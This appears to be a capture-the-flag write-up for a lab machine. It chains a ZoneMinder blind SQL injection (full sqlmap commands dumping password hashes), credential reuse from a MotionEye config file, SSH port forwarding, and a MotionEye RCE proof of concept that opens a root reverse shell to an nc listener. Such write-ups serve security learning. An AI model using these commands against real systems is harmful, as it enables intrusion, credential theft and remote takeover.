Key takeaways
  • ZoneMinder 1.37.64 login page → Blind SQL injection (CVE-2024-51482) to dump user password hashes
  • SSH as a low-privilege user → found MotionEye admin credentials in a local config file
  • MotionEye on localhost:8765 → reached it by SSH port forwarding, then used an authenticated RCE (CVE-2025-60787) for a root reverse shell

Enumeration

I started by enumerating the target.

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.7.42

I found these open ports:

22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63

I added cctv.htb to my /etc/hosts file, pointed at the target IP.

I opened the site in a browser and found a staff login page in the top right corner. I tried default credentials and logged in.

Credentials admin : admin

I found that ZoneMinder 1.37.64 was running, and it was vulnerable to a Boolean-based SQL Injection.

https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3

Foothold

I found the value of the cookie by pressing CTRL+Shift+C while I was logged in as admin.

I used sqlmap to find a user's password hash and then cracked it. The first command found the database and its tables.

python3 sqlmap.py -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID={Valie_Of_Cookie}" --batch --dbms=MySQL -p tid --technique=T --time-sec=5 --dump

The second command is the one that gives the proper credentials to crack.

python3 sqlmap.py -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID={Value_Of_Cookie}" -p tid --dbms=mysql --level=5 --risk=3 --batch -D zm -T Users --dump --threads 3

Because sqlmap takes minutes to expose the credentials, I found this payload in 0xdf's write-up.

python3 sqlmap.py -r /tmp/CCTV/removetag.request -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B --dbs

That gets the database, and then this payload gets the credentials.

python3 sqlmap.py -r /tmp/CCTV/removetag.request -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B -D zm -T Users --predict-output -C Username,Password,Name,Email --dump

The removetag.request file holds the HTTP request I copied from Burp.

cat /tmp/CCTV/removetag.request GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1 Host: cctv.htb User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0 Cookie: AddMonitorsTable.bs.table.searchText=; AddMonitorsTable.bs.table.pageNumber=1; zmSkin=classic; zmCSS=base; ZMSESSID=r07np10lqok3s9trs19a0lgimc; addMonitorsprobe_Manufacturer=; addMonitorsip=; addMonitorsprobe_username=; addMonitorsprobe_password=

I also found this script, which is also fast.

python3 new.py -i cctv.htb -u admin -p admin --users

I got some credentials and then I cracked them with hashcat.

User Access

I then used SSH to connect as mark.

ssh mark@cctv.htb

After some research, I found a .conf file.

mark@cctv:~$ cat /etc/motioneye/motion.conf # @admin_username admin # @normal_username user # @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0

I found that motioneye typically runs its web administration interface on port 8765 by default. So I ran these commands to check it.

netstat -l or ss -tulpn

I found these ports open:

tcp 0 0 localhost:7999 0.0.0.0:* LISTEN tcp 0 0 localhost:1935 0.0.0.0:* LISTEN tcp 0 0 localhost:8554 0.0.0.0:* LISTEN tcp 0 0 localhost:33060 0.0.0.0:* LISTEN tcp 0 0 localhost:8765 0.0.0.0:* LISTEN tcp 0 0 localhost:8888 0.0.0.0:* LISTEN tcp 0 0 localhost:9081

So I set up port forwarding and then connected to the web interface.

ssh -L 8765:localhost:8765 mark@cctv.htb

I used the credentials from the .conf file and logged in.

Credentials admin : 989c5a8ee87a0e9521ec81a79187d162109282f0

Privilege Escalation

After a little more searching, I found a Python script, CVE-2025-60787, to get a reverse shell.

I opened a listener on my machine with nc -lvnp 9001 and then ran the exploit from mark's session.

python3 poc.py revshell --url 'http://localhost:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i My_IP --port 9001

This gave me a reverse shell as root.
